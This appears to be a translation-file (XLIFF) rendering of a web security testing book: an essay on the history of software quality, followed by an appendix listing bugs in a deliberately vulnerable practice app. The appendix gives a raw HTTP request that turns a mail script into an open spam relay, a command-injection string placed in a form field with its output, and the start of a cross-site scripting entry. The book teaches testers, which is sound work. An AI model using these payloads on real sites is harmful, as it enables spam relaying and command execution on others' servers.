          <source>Although we're being facetious, our point is serious: Despite the fact that good software development processes are usually necessary, the software process improvement movement sold its processes to developers in a way that established an adversarial relationship between management and technical personnel. To make matters worse, many managers who knew nothing about software suddenly found their skills in high demand in software companies keen on process improvement.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, software development &lt;span class="docEmphasis"&gt;is&lt;/span&gt; fundamentally a technical task: Good developers can develop good software despite poor or no management. However, the converse is improbable: Poor technicians are unlikely to develop good software under even the best management. (For an alternative analysis but similar conclusion, mostly concerning management's role in Y2K mitigation, see Robert Glass, &amp;quot;Y2K and Other Software Noncrises,&amp;quot; &lt;span class="docEmphasis"&gt;IEEE Software&lt;/span&gt;, vol. 17, no. 2, Mar. 2002, pp. 104-100.) Thus, the CMM has propagated slowly. In many large software companies, developers are still unaware of its very existence.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The CMM is not the only software process improvement idea that came out of the 1990s. In the decade's later years, software development organizations began to apply a related theory to their processes&amp;mdash;Six Sigma, a method originally devised for reducing manufacturing and design defects in hardware systems.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Six Sigma is a disciplined, data-driven approach and methodology for eliminating defects (driving towards six sigmas between lower and upper specification limits) in any process&amp;mdash;from manufacturing to transactional and from product to service. To achieve Six Sigma, a process must not produce more than 3.4 defects per million opportunities. A Six Sigma defect is defined as anything outside of customer specifications. A Six Sigma opportunity is then the total quantity of chances for a defect (&lt;a class="docLink" target="_blank" href="http://www.isixsigma.com/sixsigma/six_sigma.asp"&gt;http://www.isixsigma.com/sixsigma/six_sigma.asp&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The problem with Six Sigma, however, is that it is not clear what one million opportunities to introduce defects into a software product means. Furthermore, how could that ever be properly measured?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To further widen the chasm dividing management and technical staff over how to develop software, the 1990s was also a decade of remarkable progress in computing infrastructure. New operating platforms eclipsed older operating systems in sophistication. Knowledge that once was useful became obsolete. New programming languages popped up and became overnight successes. Programming had to be learned and relearned. New APIs (application programming interfaces) for communication, security, distributed computing, and, of course, the Web turned developer's lives upside down. Because developers were constantly addressing the crisis of staying current, they had little time to attend to the pressures of following particular software process standards.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In defense of the software process movement, we must recognize it as a new phenomenon. Like many new phenomena, it is not completely understood and is widely misapplied. To our minds, one lesson of the 1990s is that the current state of the practice in software process does not easily support new technologies. What worked for mainframe or desktop applications does not necessarily work on products that are built quickly and deployed hourly in today's Internet-time workplace.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, like its partially successful predecessors, the emphasis on software process produced some beneficial side effects. The fact that many more developers are aware of simple things like configuration management, defect tracking, and peer review is clearly positive. The 1990s began as a process revolution and ended with the realization that process is not something that you can force on people or that will catch on in a few years. Furthermore, process for the sake of process is not enough. Process improvement comes from better technical practices, plain and simple.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, the 1990s marked the first real attempt to turn software development into engineering through the concepts of component-based software engineering (CBSE) and commercial off-the-shelf (COTS) components. The idea is to create small, high-quality parts and join them together. The problem, of course, is that high-quality parts joined together do not necessarily result in a high-quality composite system. The composite system might suffer from a flawed method of composition, or assumptions about the components' behavior or environment might be flawed. Furthermore, commercial software components, which companies usually license as executables, can yield nasty side effects unknown to the licensee. Such side effects might only manifest themselves when joined to other components and are virtually impossible to detect by testing the component in isolation. Therefore, although the divide-and-conquer paradigm works well for hardware and physical systems, it can actually be a disaster for logical systems. Only time will tell how CBSE will affect software quality's future.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec6.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>2000 to 2009: Engineering?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>2000 to 2009: Engineering?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the early years of yet another decade, we wonder what the future holds. Will this be the decade in which we solve the software quality problem? Will this be the decade in which developers and users view software failure with surprise and wonder? Or will we end this decade with the same outlook we had in 2000: All software fails, and everyone must accept it (Charles C. Mann, &amp;quot;Why Software Is So Bad, and What Is Being Done to Fix It?&amp;quot; &lt;span class="docEmphasis"&gt;MIT Technology Rev.&lt;/span&gt;, 17 June 2002).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>According to Les Hatton (&amp;quot;Does OO Sync With How We Think?&amp;quot; &lt;span class="docEmphasis"&gt;IEEE Software&lt;/span&gt;, vol. 15, no. 3, May 1998, pp. 46-54), &amp;quot;The industry standard for good commercial software is around six defects per KLOC [thousand lines of code] in an overall range of around six to 30 defects per KLOC.&amp;quot; Thus, the defect rate has held fairly constant for the last two decades, regardless of the shift to object-oriented technology, automated debuggers, better test tools, and stronger type safety in languages such as Java and Ada. Is there any reason to believe that this will change in this decade? Although the technical challenges are staggering, there's motivation in the fact that the cost of poor software quality will also climb. According to a report published in 2002 for the National Institute of Standards and Technology,</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>Estimates of the economic costs of faulty software in the US range in the tens of billions of dollars per year and have been estimated to represent approximately just under 1 percent of the nation's gross domestic product (Research Triangle Institute, &amp;quot;The Economic Impacts of Inadequate Infrastructure for Software Testing&amp;quot; NIST &lt;span class="docEmphasis"&gt;Planning Report 02-3&lt;/span&gt;, May 2002).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We are already seeing a backlash against many of the mainstream waterfall and iterative software development methods in favor of agile and Extreme Programming methods. If taken &amp;quot;to the extreme,&amp;quot; agile development is a completely unstructured, chaotic process that employs unrepeatable processes and bypasses much of the testing and design phases. Although agile development might decrease time-to-market delays and increase the rate at which programmers can write code, whether such an approach improves quality is uncertain at best.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The question of what this decade will offer sets the &amp;quot;crisis people&amp;quot; apart from those of us who believe that human ingenuity and engineering know-how will defeat the quality problem for software. After all, accountants have figured out quality, airplane manufacturers have figured it out, appliance makers have figured it out, plumbers have figured it out, and electricians have figured it out.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Software developers are at least as talented as those who work in these other professions, so we believe that higher quality software &lt;span class="docEmphasis"&gt;is&lt;/span&gt; in our future. We, as a community, can figure it out. In fact, it appears that even Bill Gates has now recognized the need to &amp;quot;crack the software quality nut,&amp;quot; &lt;a name="iddle1384"&gt;&lt;/a&gt;according to the e-mail message that he is rumored to have sent out to all employees on 15 January 2002:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>Every few years I have sent out a memo talking about the highest priority for Microsoft. Two years ago, it was the kickoff of our .NET strategy. Before that, it was several memos about the importance of the Internet to our future and the ways we could make the Internet truly useful for people. Over the last year it has become clear that ensuring .NET is a platform for Trustworthy Computing is more important than any other part of our work. If we don't do this, people simply won't be willing&amp;mdash;or able&amp;mdash;to take advantage of all the other great work we do. Trustworthy Computing is the highest priority for all the work we are doing. We must lead the industry to a whole new level of Trustworthiness in computing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Still, though, the question is &lt;span class="docEmphasis"&gt;when? When&lt;/span&gt; will we achieve the ability to create reliably high-quality software?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The answer depends heavily on whether and how fast we work from certain ideas originating in the past decades&amp;mdash;the ideas surveyed in this article. Each decade provided valuable insights, and although no decade produced a silver bullet, each provided an additional piece to the software quality puzzle.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Our community's main problem has been that it has summarily dismissed many useful ideas only because no single one was a panacea. For decades, the mindset has been that even if a technique enhanced the possibility of better software, if it didn't guarantee perfect software, it had no value. Clearly this is wrong. Until we work harder as a community of professionals to combine past proven techniques into new quality-enhancing methodologies, gearing them toward the problems we're trying to solve with software today, we will continue to wait.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;James A. Whittaker&lt;/span&gt; is a professor in the Department of Computer Sciences, Florida Institute of Technology. Contact him at &lt;a class="docLink" href="mailto:jw@cs.fit.edu"&gt;jw@cs.fit.edu&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Jeffrey M. Voas&lt;/span&gt; is director of systems assurance technologies at Science Applications International Corporation. Contact him at &lt;a class="docLink" href="mailto:Jeffrey.m.voas@saic.com"&gt;Jeffrey.m.voas@saic.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>Silver Linings in Formal Methods</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Though formal methods have not fulfilled their promise as a software development silver bullet, several of the techniques that originated in the 1980s under the formal-methods rubric remain effective.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;span class="docEmphasis"&gt;Information hiding&lt;/span&gt; refers to programs hiding information from other programs. A program may want to hide implementation details, like algorithms or data, so that if they must change then any program depending on them does not have to be rewritten. Information hiding programs have to communicate with each other through public interfaces. The beauty of information hiding is programs depend on each other only for answers and don't have to take into account how those answers were computed. (See David Parnas, &amp;quot;On the Criteria to Be Used in Decomposing Systems into Modules,&amp;quot; &lt;span class="docEmphasis"&gt;Comm. ACM&lt;/span&gt;, Dec. 1972, pp. 1053-1058.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;span class="docEmphasis"&gt;Structured programming&lt;/span&gt; refers to programming with only a limited set of control structures. Single entry, single exit control structures like WHILE loops, IF statements and assignments make programs easier to reason about and debug. Undisciplined control statements like GOTO and BREAK make programs harder to understand and to maintain. (See Edsgar Dijkstra, &amp;quot;Structured Programming,&amp;quot; &lt;span class="docEmphasis"&gt;Software Engineering: Concepts and Techniques&lt;/span&gt;, J. Buxton and colleagues, eds., Van Nostrand, Norwell, Mass., 1976.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;span class="docEmphasis"&gt;Stepwise refinement&lt;/span&gt; is a method of program construction that begins by expressing a program as a set of functional abstractions. Each refinement step records an expansion of a function into a small structured program until a complete program is built. (See Nicholas Wirth, &amp;quot;Program Development by Stepwise Refinement,&amp;quot; &lt;span class="docEmphasis"&gt;Comm. ACM&lt;/span&gt;, Apr. 1971, pp. 221-227.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>The Capability Maturity Model</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Devised by Carnegie Mellon University's Software Engineering Institute, the Capability Maturity Model &amp;quot;describes the principles and practices underlying software process maturity and is intended to help software organizations improve the maturity of their software processes in terms of an evolutionary path from ad hoc, chaotic processes to mature, disciplined software processes&amp;quot; (&lt;a class="docLink" target="_blank" href="http://www.sei.cmu.edu"&gt;http://www.sei.cmu.edu&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Briefly, the CMM's five stages of process maturity are as follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.div.ol.li.div.p.text">
          <source>&lt;span class="docEmphasis"&gt;Initial.&lt;/span&gt; Software development processes at this level are purely ad hoc.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.div.ol.li.div.p.text">
          <source>&lt;span class="docEmphasis"&gt;Repeatable.&lt;/span&gt; The process is sufficiently clear that the organization can repeat the procedure from earlier, successful projects.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.div.ol.li.div.p.text">
          <source>&lt;span class="docEmphasis"&gt;Defined.&lt;/span&gt; The organization uses a documented, standard process for management and engineering on all projects, both to develop and maintain software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.div.ol.li.div.p.text">
          <source>&lt;span class="docEmphasis"&gt;Managed.&lt;/span&gt; The organization collects, analyzes, and controls detailed, quantitative quality measures of both the software process and the resulting products.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.div.ol.li.div.p.text">
          <source>&lt;span class="docEmphasis"&gt;Optimizing.&lt;/span&gt; Key to this level is &lt;span class="docEmphasis"&gt;continuous process improvement&lt;/span&gt;, achieved through quantitative feedback and monitored introduction of new ideas and technologies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>For more detailed definitions of the stages&amp;mdash;as well as what the CMM recommends organizations at each level should do to advance to the next&amp;mdash;see the SEI Web site and M. Paulk and colleagues, &lt;span class="docEmphasis"&gt;Capability Maturity Model for Software, Version 1.1&lt;/span&gt;, tech. report CMU/SEI-93-TR-24, Software Eng. Institute, Pittsburgh, 1993.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>More Reading on Software Quality</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Robert Glass, &lt;span class="docEmphasis"&gt;Software Runaways&lt;/span&gt;, Prentice-Hall, Upper Saddle River, NJ, 1998.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Dick Hamlet, &amp;quot;An Essay on Software Testing for Quality Assurance,&amp;quot; &lt;span class="docEmphasis"&gt;Annals of Software Eng.&lt;/span&gt;, vol. 4, 1997, pp. 1-10.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>B. Marick, &amp;quot;The Tester's Triad: Bug, Product, User,&amp;quot; &lt;span class="docEmphasis"&gt;Proc. Software Testing Analysis and Review Conf.&lt;/span&gt;, Software Quality Eng. Inc., Orlando, Fla., 2000.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Glenford J. Myers, &lt;span class="docEmphasis"&gt;The Art of Software Testing&lt;/span&gt;, John Wiley &amp;amp; Sons, New York, 1979.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app02.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Appendix B. Flowershop Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Appendix B. Flowershop Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>sendmessage.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Direct Request</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>By sending a direct request to the &lt;tt&gt;sendmessage.php&lt;/tt&gt; script, an attacker can get the Web application to send an e-mail of its choice, with whatever subject, return address, and message that it likes, and any number of times it wants (open mailer). The Web application protects against this by checking the HTTP-Referer field, but you cannot rely on this. You can specify it in a direct request.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Use Netcat to send a request to the server by connecting to the server's port 80 and echoing the following. You can't use TELNET because it echoes at the end of each line and will terminate after the blank like in the request.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>POST /hackerland/sendmessage.php HTTP/1.0
Referer:
 http://crash.se.fit.edu/hackerland/tellfriend.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
subject=Money+making+scheme&amp;amp;email=myemail@scam.net&amp;amp;start
 txt=Free+Money!!!&amp;amp;endtxt=&amp;amp;from=A+Friend&amp;amp;to=user
 @hotmail.com&amp;amp;message=email+me+to+find+out+how</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>If you change the field values, make sure you update the Content-Length field to reflect the new site (count of characters in the parameters string).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>This is one of the hardest bugs to find and exploit in the Flowershop application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The server will respond with the message that an e-mail would have been sent with the data provided in the preceding query. For example, the response from the server for the preceding query would be as follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>   HTTP/1.1 200 OK
Date: Thu, 18 Dec 2003 04:49:01 GMT
Server: Apache/2.0.40 (Red Hat Linux)
Accept-Ranges: bytes
X-Powered-By: PHP/4.2.2
Content-Length: 2690
Connection: close
Content-Type: text/html; charset=ISO-8859-1


&amp;lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01
 Transitional//EN"&amp;gt;
&amp;lt;html&amp;gt;
[...cut HTML page formatting code...]
&amp;lt;pre&amp;gt;This is the fakemail system, this email will NOT be
 delivered and is intended for testing purposes ONLY!
Here's the e-mail that would have been sent:
Sent From: myemail@scam.net
Sent To: user@hotmail.com
Subject: Money making scheme
Message: Free Money!!!email me to find out how
&amp;lt;/pre&amp;gt;
[...cut HTML page formatting code...]
&amp;lt;/html&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;tt&gt;sendmessage.php&lt;/tt&gt; (called from &lt;tt&gt;tellfriend.php&lt;/tt&gt;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Command Injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The Send Message page calls (what would be) an external program to send e-mail to another user. It is possible to submit information to this page that will cause it to execute command-line programs on the server and echo the results back to the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>In the Tell a Friend form, enter any data for the From and To fields. Within the Message field, enter the following: &lt;tt&gt;'; ls &amp;ndash;al ; &amp;lt;cr&amp;gt;&lt;/tt&gt; The initial &lt;tt&gt;'&lt;/tt&gt; terminates the parameter, the &lt;tt&gt;;&lt;/tt&gt; starts a new command, &lt;tt&gt;ls &amp;ndash;al&lt;/tt&gt; is the command to execute (could easily be something else), the final &lt;tt&gt;;&lt;/tt&gt; makes the &lt;tt&gt;'&lt;/tt&gt; that is appended to the intended command be the start of a new command (although it's an invalid one), and the &lt;tt&gt;&amp;lt;cr&amp;gt;&lt;/tt&gt; (carriage return) executes the invalid final command.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>All depends on the command to execute. If using the preceding example, the expected output should be this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>This is the fakemail system, this email will NOT be
 delivered and is intended for testing purposes ONLY!
Here's the e-mail that would have been sent:
Sent From: noreply@nowhere.com
Sent To: on
Subject: Message from Flos Flowershop
Message: You have been sent a message from Flos
 Flowershop. Message follows\n&amp;mdash;-\n\n
total 352
drwxrwxrwx    9 root     root         4096 Dec 12 14:09
 .
drwxrwxrwx    9 root     root         4096 Dec  3 14:42
 ..
-rwxr&amp;mdash;r&amp;mdash; 1 nobody nobody 4079 Dec 10 15:00 account.php
-rwxr&amp;mdash;r&amp;mdash; 1 nobody nobody 3084 Dec  8 16:08
 addmessage.php

...
[rest of directory listing]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>guestbook.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Cross-Site Scripting</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The page that posts data for this page (&lt;tt&gt;Addmessage.php&lt;/tt&gt;) doesn't check for illegal input; therefore, you can include script elements in this page that will (depending on browser settings) be executed automatically whenever a user views this page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
